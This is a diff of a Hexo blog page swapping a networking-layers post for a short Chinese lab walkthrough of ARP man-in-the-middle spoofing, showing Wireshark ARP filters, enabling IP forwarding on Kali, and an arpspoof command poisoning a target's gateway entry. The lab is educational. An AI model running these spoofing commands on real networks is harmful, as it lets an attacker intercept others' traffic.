@@ -11,7 +11,7 @@
   
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
   <title>
-    计算机网络体系总结构 |  wzkang
+    ARP中间人攻击 |  wzkang
   </title>
   <meta name="generator" content="hexo-theme-ayer">
   
@@ -46,7 +46,7 @@
     <main class="content on">
       <section class="outer">
   <article
-  id="post-网络结构"
+  id="post-ARP中间人攻击"
   class="article article-type-post"
   itemscope
   itemprop="blogPost"
@@ -57,15 +57,15 @@
     <header class="article-header">
        
 <h1 class="article-title sea-center" style="border-left:0" itemprop="name">
-  计算机网络体系总结构
+  ARP中间人攻击
 </h1>
  
 
     </header>
      
     <div class="article-meta">
-      <a href="/2021/03/05/%E7%BD%91%E7%BB%9C%E7%BB%93%E6%9E%84/" class="article-date">
-  <time datetime="2021-03-05T14:14:59.000Z" itemprop="datePublished">2021-03-05</time>
+      <a href="/2021/03/19/ARP%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB/" class="article-date">
+  <time datetime="2021-03-19T14:58:51.000Z" itemprop="datePublished">2021-03-19</time>
 </a> 
   <div class="article-category">
     <a class="article-category-link" href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/">网络安全</a>
@@ -76,7 +76,7 @@
         <span class="post-meta-item-icon">
             <i class="ri-quill-pen-line"></i>
             <span class="post-meta-item-text"> 字数统计:</span>
-            <span class="post-count">786</span>
+            <span class="post-count">436</span>
         </span>
     </span>
 
@@ -100,26 +100,30 @@
   
     <div class="article-entry" itemprop="articleBody">
        
-  <p><strong>计算机网络总体结构</strong></p>
-<h3 id="一-网络分层"><a href="#一-网络分层" class="headerlink" title="一.  网络分层"></a>一.  网络分层</h3><h4 id="1-物理层（physical-layer）"><a href="#1-物理层（physical-layer）" class="headerlink" title="1.物理层（physical layer）"></a>1.物理层（physical layer）</h4><p>物理层的任务就是传输<u>位流</u>。</p>
-<h4 id="2-数据链路层（data-link-layer）"><a href="#2-数据链路层（data-link-layer）" class="headerlink" title="2.数据链路层（data link layer）"></a>2.数据链路层（data link layer）</h4><p>数据链路层的任务是负责<u>相邻结点间</u>的通信。</p>
-<h4 id="3-网络层（network-layer）"><a href="#3-网络层（network-layer）" class="headerlink" title="3.网络层（network layer）"></a>3.网络层（network layer）</h4><p>网络层的任务是为数据在<u>网络中</u>选择一条合适的路径。</p>
-<h4 id="4-运输层（transport-layer）"><a href="#4-运输层（transport-layer）" class="headerlink" title="4.运输层（transport layer）"></a>4.运输层（transport layer）</h4><p>运输层的任务是负责不同计算机中两个<u>进程间</u>的通信。</p>
-<h4 id="5-应用层（application-layer）"><a href="#5-应用层（application-layer）" class="headerlink" title="5.应用层（application layer）"></a>5.应用层（application layer）</h4><p>应用层就是为了让用户能够使用网络，如浏览网页、QQ聊天、收发电子邮件。</p>
-<h3 id="二-计算机网络中的重要概念"><a href="#二-计算机网络中的重要概念" class="headerlink" title="二.  计算机网络中的重要概念"></a>二.  计算机网络中的重要概念</h3><p>用寄信的例子类比</p>
-<p><img src="/2021/03/05/%E7%BD%91%E7%BB%9C%E7%BB%93%E6%9E%84/1614954918622.png" alt="1614954918622"></p>
-<h4 id="1．实体（entity）"><a href="#1．实体（entity）" class="headerlink" title="1．实体（entity）"></a>1．实体（entity）</h4><p>实体指计算机网络中参与发送或接收数据的<strong>硬件</strong>或<strong>软件进程</strong>。不同的层有不同的实体，位于不同计算机中同一层内的实体称为<strong>对等实体</strong>。</p>
-<h4 id="2．服务（service）"><a href="#2．服务（service）" class="headerlink" title="2．服务（service）"></a>2．服务（service）</h4><p>下层实体提供给上层实体使用的功能称为服务。服务通常通过函数调用来实现。</p>
-<h4 id="3．协议（protocol）"><a href="#3．协议（protocol）" class="headerlink" title="3．协议（protocol）"></a>3．协议（protocol）</h4><p><strong>协议规定了两个对等实体进行通信时的数据格式，以及在收发数据时及其他事件发生时应进行的操作。</strong>既然协议是控制对等实体的，那么<strong>一个协议必然位于某一层内</strong>，不同的层内有不同的协议。因特网有两个最重要的协议TCP与IP，因此因特网的体系结构才称为TCP/IP体系结构。<br>有的协议非常简单，有的则非常复杂。很多复杂协议之所以复杂，是因为要对很多非正常情况进行处理，此时工作量远远超过了处理正常情况的工作量。</p>
-<h4 id="4．协议数据单元（protocol-data-unit，PDU）"><a href="#4．协议数据单元（protocol-data-unit，PDU）" class="headerlink" title="4．协议数据单元（protocol data unit，PDU）"></a>4．协议数据单元（protocol data unit，PDU）</h4><p>每层实体都有自己处理数据的单位。这种某层实体处理数据的单位称为该层的协议数据单元。PDU通常分为首部与数据两部分。</p>
-<h4 id="5．封装与拆封（encapsulation-and-decapsulation）"><a href="#5．封装与拆封（encapsulation-and-decapsulation）" class="headerlink" title="5．封装与拆封（encapsulation and decapsulation）"></a>5．封装与拆封（encapsulation and decapsulation）</h4><p>在上层实体交付的PDU外面加上首部形成本层PDU的过程称为封装。去掉本层PDU首部从而得到上层PDU的过程称为拆封或解封装。某层的接收实体只查看本层PDU的首部，这个首部则是发送方的同层对等实体加上的。</p>
-<h4 id="6．复用与分用"><a href="#6．复用与分用" class="headerlink" title="6．复用与分用"></a>6．复用与分用</h4><p>运输层中的复用与分用：</p>
-<p><img src="/2021/03/05/%E7%BD%91%E7%BB%9C%E7%BB%93%E6%9E%84/1614955208586.png" alt="1614955208586"></p>
-<p>其他层也有这个问题：某层可能有多个实体，下层向其提交数据时，应该给哪个实体？需要PDU首部中的一个字段加以区分。</p>
-<h3 id="三-网络的运作过程"><a href="#三-网络的运作过程" class="headerlink" title="三.  网络的运作过程"></a>三.  网络的运作过程</h3><p>计算机具有全部5层实体，工作过程容易理解。网络设备如何工作呢？<br>“集线器工作在物理层；交换机工作在数据链路层；路由器工作在网络层”的确切意思是指该设备会查看该层及其下面其他层的PDU的首部。路由器的工作原理：</p>
-<p><img src="/2021/03/05/%E7%BD%91%E7%BB%9C%E7%BB%93%E6%9E%84/1614955342673.png" alt="1614955342673"></p>
-<p>网络分层动画。</p>
-<h3 id="四-网络各层协议"><a href="#四-网络各层协议" class="headerlink" title="四. 网络各层协议"></a>四. 网络各层协议</h3><p><img src="/2021/03/05/%E7%BD%91%E7%BB%9C%E7%BB%93%E6%9E%84/1614955410501.png" alt="1614955410501"></p>
+  <h3 id="ARP中间人攻击"><a href="#ARP中间人攻击" class="headerlink" title="ARP中间人攻击"></a>ARP中间人攻击</h3><h3 id="一-wireshark显示过滤器中ARP常用指令"><a href="#一-wireshark显示过滤器中ARP常用指令" class="headerlink" title="一.wireshark显示过滤器中ARP常用指令"></a>一.wireshark显示过滤器中ARP常用指令</h3><p>筛选类型为请求（reques）的ARP</p>
+<p><code>arp.opcode == 0x001</code></p>
+<p>筛选类型为响应(reply)的ARP</p>
+<p><code>arp.opcode == 0x002</code></p>
+<p>筛选指定源MAC地址的ARP </p>
+<p><code>arp.src.hw_mac == MAC地址</code></p>
+<p>筛选指点源为MAC地址并且类型为请求的</p>
+<p><code>arp.src.hw_mac == MAC地址 &amp;&amp; arp.opcode == 0x001</code></p>
+<h3 id="二-实验准备"><a href="#二-实验准备" class="headerlink" title="二. 实验准备"></a>二. 实验准备</h3><p>目标主机： </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">IPv4 地址 . . . . . . . . . . . . : 192.168.43.108(首选)</span><br><span class="line">物理地址. . . . . . . . . . . . . : 04-ED-33-8B-35-6C</span><br><span class="line">默认网关. . . . . . . . . . . . . : 192.168.43.1</span><br><span class="line">其中网关：192.168.43.1 的物理地址为 34-d7-12-a2-0d-2e     动态</span><br></pre></td></tr></table></figure>
+<p>攻击主机： kali linux</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">eth2: flags&#x3D;4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500</span><br><span class="line">        inet 192.168.43.160  netmask 255.255.255.0  broadcast 192.168.43.255</span><br><span class="line">        inet6 fe80::20c:29ff:fe37:28c3  prefixlen 64  scopeid 0x20&lt;link&gt;</span><br><span class="line">        inet6 2409:893c:1546:221:20c:29ff:fe37:28c3  prefixlen 64  scopeid 0x0&lt;global&gt;</span><br><span class="line">        ether 00:0c:29:37:28:c3  txqueuelen 1000  (Ethernet)</span><br><span class="line">        RX packets 66  bytes 9334 (9.1 KiB)</span><br><span class="line">        RX errors 0  dropped 0  overruns 0  frame 0</span><br><span class="line">        TX packets 111  bytes 9319 (9.1 KiB)</span><br><span class="line">        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0</span><br></pre></td></tr></table></figure>
+<p>攻击目的：欺骗目标主机192.168.100.5，让其以为网关为192.168.43.1的物理地址为<strong>00:0c:29:37:28:c3</strong>（黑客的kaili网卡eth0的物理地址）</p>
+<p>开启kali的路由转发功能</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo 1 &gt; &#x2F;proc&#x2F;sys&#x2F;net&#x2F;ipv4&#x2F;ip_forward</span><br></pre></td></tr></table></figure>
+<h3 id="三-开始攻击"><a href="#三-开始攻击" class="headerlink" title="三.开始攻击"></a>三.开始攻击</h3><p>在kali终端中使用arpspoof工具</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">arpspoof -i eth2 -t 192.168.43.108 192.168.43.1</span><br></pre></td></tr></table></figure>
+<p>执行命令后，向目标主机发送大量的arp相应（arp reply）,使得目标主机以为网关的物理地址为</p>
+<p><strong>00:0c:29:37:28:c3</strong></p>
+<p><img src="/2021/03/19/ARP%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB/1616257541863.png" alt="1616257541863"></p>
+<p>在目标主机终端中查看arp缓存表</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\WINDOWS\system32&gt;arp -a</span><br></pre></td></tr></table></figure>
+<p>可以发现表中的物理地址的确改成了黑客网卡的物理地址</p>
+<p><img src="/2021/03/19/ARP%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB/1616257736578.png" alt="1616257736578"></p>
  
       <!-- reward -->
       
@@ -184,12 +188,12 @@
     <a class="modal-close" href="javascript:;"><i class="ri-close-circle-line"></i></a>
     <p>扫一扫，分享到微信</p>
     <div class="wx-qrcode">
-      <img src="//api.qrserver.com/v1/create-qr-code/?size=150x150&data=http://example.com/2021/03/05/%E7%BD%91%E7%BB%9C%E7%BB%93%E6%9E%84/" alt="微信分享二维码">
+      <img src="//api.qrserver.com/v1/create-qr-code/?size=150x150&data=http://example.com/2021/03/19/ARP%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB/" alt="微信分享二维码">
     </div>
 </div>
 
 <div id="share-mask"></div>  
-  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE%E5%88%86%E6%9E%90/" rel="tag">网络协议分析</a></li></ul>
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%BA%94%E7%94%A8-%E7%BD%91%E7%BB%9C%E5%B1%82/" rel="tag">网络安全应用(网络层)</a></li></ul>
 
     </footer>
   </div>
@@ -197,19 +201,10 @@
    
   <nav class="article-nav">
     
-      <a href="/2021/03/08/%E6%95%B0%E6%8D%AE%E9%93%BE%E8%B7%AF%E5%B1%82/" class="article-nav-link">
-        <strong class="article-nav-caption">上一篇</strong>
-        <div class="article-nav-title">
-          
-            数据链路层
-          
-        </div>
-      </a>
     
-    
-      <a href="/2021/01/04/31%E5%8A%A8%E4%BD%9C/" class="article-nav-link">
+      <a href="/2021/03/19/ARP%E5%8D%8F%E8%AE%AE/" class="article-nav-link">
         <strong class="article-nav-caption">下一篇</strong>
-        <div class="article-nav-title">31动作</div>
+        <div class="article-nav-title">ARP协议</div>
       </a>
     
   </nav>
